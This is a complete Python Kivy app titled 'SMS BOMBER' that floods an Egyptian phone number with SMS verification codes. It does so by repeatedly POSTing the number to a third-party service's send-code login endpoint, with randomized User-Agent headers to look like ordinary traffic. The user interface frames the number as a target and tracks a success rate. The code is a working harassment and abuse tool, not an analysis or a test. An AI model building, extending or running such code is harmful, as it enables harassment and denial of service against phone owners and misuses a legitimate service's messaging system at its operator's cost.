from kivy.app import App
from kivy.uix.boxlayout import BoxLayout
from kivy.uix.label import Label
from kivy.uix.textinput import TextInput
from kivy.uix.button import Button
from kivy.uix.progressbar import ProgressBar
from kivy.uix.gridlayout import GridLayout
from kivy.clock import Clock
from kivy.graphics import Color, Rectangle
import threading
import time
import json
import random
import string
import datetime
from datetime import timedelta
import requests
from kivy.logger import Logger

class SMSBomberApp(App):
    def __init__(self):
        super().__init__()
        self.is_running = False
        self.success_count = 0
        self.failure_count = 0
        self.total_sent = 0
        self.current_thread = None
        self.animation_phase = 0
        self.stats_animation_phase = 0
        
        # Your purchased API endpoint
        self.api_url = "https://api.twistmena.com/music/Dlogin/sendCode"
        
        # Enhanced Color Theme with better contrast
        self.colors = {
            'bg': [0.06, 0.06, 0.14, 1],
            'card_bg': [0.12, 0.12, 0.22, 1],
            'accent': [0.58, 0.15, 0.95, 1],
            'accent_light': [0.68, 0.35, 1.0, 1],
            'success': [0.0, 0.90, 0.75, 1],
            'error': [1.0, 0.35, 0.45, 1],
            'warning': [1.0, 0.55, 0.30, 1],
            'text': [1, 1, 1, 1],
            'text_secondary': [0.80, 0.80, 0.90, 1],
            'input_bg': [0.20, 0.19, 0.38, 1]
        }

    def build(self):
        # Main layout with optimized spacing
        main_layout = BoxLayout(orientation='vertical', padding=[20, 30, 20, 20], spacing=10)
        main_layout.canvas.before.clear()
        with main_layout.canvas.before:
            Color(*self.colors['bg'])
            Rectangle(pos=main_layout.pos, size=main_layout.size)
        
        # Store reference to main layout for animations
        self.main_layout = main_layout
        
        # ===== BIG EYE-CATCHING HEADER =====
        header_layout = BoxLayout(orientation='vertical', size_hint=(1, 0.25), spacing=0)
        
        # Big eye-catching application name
        self.title_label = Label(
            text='SMS BOMBER', 
            font_size='53sp',  # Very large and eye-catching
            bold=True,
            color=self.colors['accent'],
            size_hint=(1, 0.5)
        )
        header_layout.add_widget(self.title_label)
        
        # "Designed by Ahmed Tharwat" - readable and nicely sized
        subtitle_label = Label(
            text='Designed by Ahmed Tharwat',
            font_size='25sp',  # Nice readable size, smaller than title
            color=[0.65, 0.65, 0.85, 1],  # Softer color for good contrast
            size_hint=(1, 0.2)
        )
        header_layout.add_widget(subtitle_label)
        
        main_layout.add_widget(header_layout)
        
        # ===== INPUT SECTION =====
        input_layout = BoxLayout(orientation='vertical', spacing=8, size_hint=(1, 0.35))
        input_layout.canvas.before.clear()
        with input_layout.canvas.before:
            Color(*self.colors['card_bg'])
            Rectangle(pos=input_layout.pos, size=input_layout.size)
        
        # Phone input
        phone_container = BoxLayout(orientation='vertical', size_hint=(1, 0.33), spacing=3)
        phone_label = Label(
            text='PHONE NUMBER',
            color=self.colors['text'], 
            size_hint=(1, 0.4),
            font_size='16sp',
            bold=True
        )
        phone_container.add_widget(phone_label)
        self.phone_input = TextInput(
            hint_text='01xxxxxxxxx',
            multiline=False,
            size_hint=(1, 0.6),
            background_color=self.colors['input_bg'],
            foreground_color=self.colors['text_secondary'],
            background_normal='',
            background_active='',
            padding=[18, 12],
            font_size='16sp'
        )
        phone_container.add_widget(self.phone_input)
        input_layout.add_widget(phone_container)
        
        # Message count
        count_container = BoxLayout(orientation='vertical', size_hint=(1, 0.33), spacing=3)
        count_label = Label(
            text='MESSAGE COUNT',
            color=self.colors['text'], 
            size_hint=(1, 0.4),
            font_size='16sp',
            bold=True
        )
        count_container.add_widget(count_label)
        self.count_input = TextInput(
            hint_text='Enter number of messages',
            multiline=False,
            size_hint=(1, 0.6),
            background_color=self.colors['input_bg'],
            foreground_color=self.colors['text_secondary'],
            background_normal='',
            background_active='',
            padding=[18, 12],
            font_size='16sp'
        )
        count_container.add_widget(self.count_input)
        input_layout.add_widget(count_container)
        
        # Delay input
        delay_container = BoxLayout(orientation='vertical', size_hint=(1, 0.33), spacing=3)
        delay_label = Label(
            text='START DELAY (SECONDS)',
            color=self.colors['text'], 
            size_hint=(1, 0.4),
            font_size='16sp',
            bold=True
        )
        delay_container.add_widget(delay_label)
        self.delay_input = TextInput(
            hint_text='Delay before starting',
            multiline=False,
            size_hint=(1, 0.6),
            background_color=self.colors['input_bg'],
            foreground_color=self.colors['text_secondary'],
            background_normal='',
            background_active='',
            padding=[18, 12],
            font_size='16sp'
        )
        delay_container.add_widget(self.delay_input)
        input_layout.add_widget(delay_container)
        
        main_layout.add_widget(input_layout)
        
        # ===== SMALLER BUTTONS =====
        button_layout = BoxLayout(orientation='horizontal', spacing=10, size_hint=(1, 0.08))  # Smaller height
        
        self.start_button = Button(
            text='START BOMBING',
            background_color=self.colors['accent'],
            background_normal='',
            size_hint=(0.65, 1),
            font_size='15sp',  # Slightly smaller font
            bold=True
        )
        self.start_button.bind(on_press=self.start_bombing)
        button_layout.add_widget(self.start_button)
        
        self.stop_button = Button(
            text='STOP',
            background_color=[0.35, 0.29, 0.42, 1],
            background_normal='',
            size_hint=(0.35, 1),
            disabled=True,
            font_size='15sp',  # Slightly smaller font
            bold=True
        )
        self.stop_button.bind(on_press=self.stop_bombing)
        button_layout.add_widget(self.stop_button)
        
        main_layout.add_widget(button_layout)
        
        # ===== PROGRESS SECTION =====
        progress_container = BoxLayout(orientation='vertical', spacing=5, size_hint=(1, 0.09))
        
        self.progress_bar = ProgressBar(
            max=100, 
            size_hint=(1, 0.6)
        )
        progress_container.add_widget(self.progress_bar)
        
        self.progress_label = Label(
            text='System Ready - Configure Target Parameters',
            color=self.colors['text_secondary'],
            size_hint=(1, 0.4),
            font_size='12sp'
        )
        progress_container.add_widget(self.progress_label)
        
        main_layout.add_widget(progress_container)
        
        # ===== STATISTICS =====
        stats_layout = GridLayout(cols=3, spacing=12, size_hint=(1, 0.18))
        stats_layout.canvas.before.clear()
        with stats_layout.canvas.before:
            Color(*self.colors['card_bg'])
            Rectangle(pos=stats_layout.pos, size=stats_layout.size)
        
        # Success counter
        success_container = BoxLayout(orientation='vertical', spacing=1)
        self.success_title = Label(
            text='SUCCESS', 
            color=self.colors['success'], 
            bold=True,
            font_size='15sp'
        )
        success_container.add_widget(self.success_title)
        self.success_label = Label(
            text='0', 
            font_size='28sp',
            color=self.colors['success'], 
            bold=True
        )
        success_container.add_widget(self.success_label)
        stats_layout.add_widget(success_container)
        
        # Failure counter
        failure_container = BoxLayout(orientation='vertical', spacing=1)
        self.failure_title = Label(
            text='FAILED', 
            color=self.colors['error'], 
            bold=True,
            font_size='15sp'
        )
        failure_container.add_widget(self.failure_title)
        self.failure_label = Label(
            text='0', 
            font_size='28sp',
            color=self.colors['error'], 
            bold=True
        )
        failure_container.add_widget(self.failure_label)
        stats_layout.add_widget(failure_container)
        
        # Total counter
        total_container = BoxLayout(orientation='vertical', spacing=1)
        self.total_title = Label(
            text='TOTAL', 
            color=self.colors['warning'], 
            bold=True,
            font_size='15sp'
        )
        total_container.add_widget(self.total_title)
        self.total_label = Label(
            text='0', 
            font_size='28sp',
            color=self.colors['warning'], 
            bold=True
        )
        total_container.add_widget(self.total_label)
        stats_layout.add_widget(total_container)
        
        main_layout.add_widget(stats_layout)
        
        # ===== SUCCESS RATE - GREEN LIGHT, NO EMOJI =====
        rate_container = BoxLayout(orientation='vertical', size_hint=(1, 0.05))
        self.rate_label = Label(
            text='SUCCESS RATE: 0%',
            color=[0.0, 0.90, 0.75, 1],  # Green light color
            bold=True,
            font_size='18sp'  # Good readable size
        )
        rate_container.add_widget(self.rate_label)
        main_layout.add_widget(rate_container)
        
        # Start enhanced animations after a short delay
        Clock.schedule_once(lambda dt: self.start_animations(), 0.1)
        
        return main_layout

    def start_animations(self):
        """Enhanced animations with multiple effects"""
        self.animation_phase = 0
        self.stats_animation_phase = 0
        self.animate_title()
        self.animate_stat_titles()

    def animate_title(self):
        """Enhanced smooth pulsing title animation"""
        if not hasattr(self, 'title_label') or self.title_label is None:
            return
            
        phases = [
            self.colors['accent'],
            self.colors['accent_light'],
            [0.75, 0.45, 1.0, 1],
            [0.65, 0.25, 0.95, 1],
            self.colors['accent_light']
        ]
        self.animation_phase = (self.animation_phase + 1) % len(phases)
        self.title_label.color = phases[self.animation_phase]
        
        Clock.schedule_once(lambda dt: self.animate_title(), 1.5)

    def animate_stat_titles(self):
        """Animate statistics titles with pulsing effect"""
        if not hasattr(self, 'success_title'):
            return
            
        pulse_colors = {
            'success': [
                self.colors['success'],
                [0.2, 0.95, 0.8, 1],
                self.colors['success']
            ],
            'error': [
                self.colors['error'],
                [1.0, 0.5, 0.5, 1],
                self.colors['error']
            ],
            'warning': [
                self.colors['warning'],
                [1.0, 0.7, 0.4, 1],
                self.colors['warning']
            ]
        }
        
        self.stats_animation_phase = (self.stats_animation_phase + 1) % 3
        
        self.success_title.color = pulse_colors['success'][self.stats_animation_phase]
        self.failure_title.color = pulse_colors['error'][self.stats_animation_phase]
        self.total_title.color = pulse_colors['warning'][self.stats_animation_phase]
        
        Clock.schedule_once(lambda dt: self.animate_stat_titles(), 2.0)

    def validate_egypt_number(self, number):
        """Validate Egyptian phone number"""
        if number == "01xxxxxxxxx":
            return None
            
        number = number.replace(" ", "").replace("-", "").replace("+", "")
        
        if number.startswith("01") and len(number) == 11:
            return "2" + number
        elif number.startswith("1") and len(number) == 10:
            return "20" + number
        elif number.startswith("01") and len(number) == 10:
            return "2" + number
        else:
            return None

    def get_random_headers(self):
        """Generate random headers for API requests"""
        user_agents = [
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
            "Mozilla/5.0 (iPhone; CPU iPhone OS 17_0 like Mac OS X) AppleWebKit/605.1.15",
            "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.0",
        ]
        
        return {
            "User-Agent": random.choice(user_agents),
            "Content-Type": "application/json",
            "Accept": "application/json",
        }

    def log_message(self, message):
        """Keep functionality but remove visual log"""
        # Logging functionality preserved but no UI display
        timestamp = datetime.datetime.now().strftime("%H:%M:%S")
        print(f"[{timestamp}] {message}")  # Console logging only

    def update_progress(self, current, total):
        """Update progress bar"""
        percentage = (current / total) * 100 if total > 0 else 0
        self.progress_bar.value = percentage
        self.progress_label.text = f"Progress: {current}/{total} ({percentage:.1f}%)"

    def update_stats(self):
        """Update statistics with enhanced animations"""
        total = self.success_count + self.failure_count
        self.success_label.text = str(self.success_count)
        self.failure_label.text = str(self.failure_count)
        self.total_label.text = str(total)
        
        if total > 0:
            success_rate = (self.success_count / total) * 100
            
            # Enhanced color transitions with more levels
            if success_rate >= 85:
                rating = "PHENOMENAL"
                color = [0.0, 1.0, 0.8, 1]  # Bright cyan
            elif success_rate >= 70:
                rating = "EXCELLENT"
                color = self.colors['success']
            elif success_rate >= 55:
                rating = "GREAT"
                color = [0.3, 0.9, 0.6, 1]  # Bright green
            elif success_rate >= 40:
                rating = "GOOD"
                color = [1.0, 0.75, 0.3, 1]  # Gold
            elif success_rate >= 25:
                rating = "FAIR"
                color = self.colors['warning']
            else:
                rating = "NEEDS IMPROVEMENT"
                color = self.colors['error']
            
            self.rate_label.text = f"SUCCESS RATE: {success_rate:.1f}% • {rating}"
            self.rate_label.color = color

    def start_bombing(self, instance):
        """Start SMS bombing operation"""
        number = self.phone_input.text.strip()
        if not number or number == "01xxxxxxxxx":
            self.log_message("ERROR: Please enter phone number")
            return
        
        validated_number = self.validate_egypt_number(number)
        if not validated_number:
            self.log_message("ERROR: Invalid Egyptian phone number format")
            self.log_message("Use format: 01XXXXXXXXX")
            return
        
        try:
            sms_count = int(self.count_input.text)
            if sms_count <= 0:
                self.log_message("ERROR: Message count must be greater than 0")
                return
        except ValueError:
            self.log_message("ERROR: Please enter valid message count")
            return
        
        try:
            delay_seconds = int(self.delay_input.text or "0")
            if delay_seconds < 0:
                self.log_message("ERROR: Delay cannot be negative")
                return
        except ValueError:
            self.log_message("ERROR: Please enter valid delay time")
            return
        
        # Update UI
        self.is_running = True
        self.start_button.disabled = True
        self.start_button.background_color = [0.35, 0.29, 0.42, 1]
        self.stop_button.disabled = False
        self.stop_button.background_color = self.colors['accent']
        
        # Reset statistics
        self.success_count = 0
        self.failure_count = 0
        self.update_stats()
        self.progress_bar.value = 0
        
        self.log_message("STARTING SMS BOMBING - PROFESSIONAL MODE")
        self.log_message(f"TARGET: {number}")
        self.log_message(f"VALIDATED: {validated_number}")
        self.log_message(f"COUNT: {sms_count} messages")
        self.log_message(f"DELAY: {delay_seconds} seconds")
        self.log_message(f"API ENDPOINT: {self.api_url}")
        self.log_message("UNLIMITED MODE ACTIVATED")
        
        # Start operation in separate thread
        self.current_thread = threading.Thread(
            target=self.send_messages, 
            args=(validated_number, sms_count, delay_seconds),
            daemon=True
        )
        self.current_thread.start()

    def stop_bombing(self, instance):
        """Stop SMS bombing operation"""
        self.is_running = False
        self.log_message("OPERATION STOPPED BY USER")
        self.stop_button.disabled = True
        self.stop_button.background_color = [0.35, 0.29, 0.42, 1]
        self.start_button.disabled = False
        self.start_button.background_color = self.colors['accent']

    def send_messages(self, number, sms_count, delay_seconds):
        """Send messages using the actual API"""
        # Initial delay if specified
        if delay_seconds > 0:
            self.log_message(f"Starting in {delay_seconds} seconds...")
            for remaining in range(delay_seconds, 0, -1):
                if not self.is_running:
                    return
                mins, secs = divmod(remaining, 60)
                Clock.schedule_once(lambda dt: setattr(
                    self.progress_label, 'text', f"Starting in: {mins:02d}:{secs:02d}"
                ), 0)
                time.sleep(1)
        
        Clock.schedule_once(lambda dt: self.log_message("TARGET ACQUIRED - SENDING VERIFICATION CODES NOW"), 0)
        
        # Send messages using your actual API
        for i in range(sms_count):
            if not self.is_running:
                break
            
            try:
                # Prepare payload for your API
                payload = {
                    "dial": number,
                    "randomValue": ''.join(random.choices(string.ascii_letters + string.digits, k=8)),
                    "timestamp": int(time.time() * 1000),
                }
                
                headers = self.get_random_headers()
                
                # Make API request to your purchased endpoint
                response = requests.post(
                    self.api_url, 
                    headers=headers, 
                    json=payload,
                    timeout=15
                )
                
                if response.status_code == 200:
                    Clock.schedule_once(lambda dt: self.log_message(f"Message {i+1}/{sms_count} - VERIFICATION CODE SENT"), 0)
                    self.success_count += 1
                else:
                    Clock.schedule_once(lambda dt: self.log_message(f"Message {i+1}/{sms_count} - FAILED (Code: {response.status_code})"), 0)
                    self.failure_count += 1
                    
            except requests.exceptions.Timeout:
                Clock.schedule_once(lambda dt: self.log_message(f"Message {i+1}/{sms_count} - TIMEOUT"), 0)
                self.failure_count += 1
            except requests.exceptions.ConnectionError:
                Clock.schedule_once(lambda dt: self.log_message(f"Message {i+1}/{sms_count} - CONNECTION ERROR"), 0)
                self.failure_count += 1
            except Exception as e:
                Clock.schedule_once(lambda dt: self.log_message(f"Message {i+1}/{sms_count} - ERROR: {str(e)}"), 0)
                self.failure_count += 1
            
            # Update UI
            Clock.schedule_once(lambda dt: self.update_progress(i + 1, sms_count), 0)
            Clock.schedule_once(lambda dt: self.update_stats(), 0)
            
            # Delay between requests (minimum 0.5 seconds for stability)
            if self.is_running and i < sms_count - 1:
                time.sleep(max(0.5, 1))
        
        # Finish operation
        Clock.schedule_once(lambda dt: self.finish_bombing(), 0)

    def finish_bombing(self):
        """Finish operation and update UI"""
        self.is_running = False
        self.stop_button.disabled = True
        self.stop_button.background_color = [0.35, 0.29, 0.42, 1]
        self.start_button.disabled = False
        self.start_button.background_color = self.colors['accent']
        self.progress_bar.value = 100
        
        total = self.success_count + self.failure_count
        if total > 0:
            success_rate = (self.success_count / total) * 100
            self.log_message("OPERATION COMPLETED")
            self.log_message(f"SUCCESS: {self.success_count} verification codes sent")
            self.log_message(f"FAILED: {self.failure_count}")
            self.log_message(f"SUCCESS RATE: {success_rate:.1f}%")
            
            if success_rate > 70:
                self.log_message("PERFORMANCE: EXCELLENT")
            elif success_rate > 40:
                self.log_message("PERFORMANCE: GOOD")
            else:
                self.log_message("PERFORMANCE: AVERAGE - Check network connection")

        self.progress_label.text = "Operation completed - Ready for next mission"

def main():
    SMSBomberApp().run()

if __name__ == '__main__':
    main()
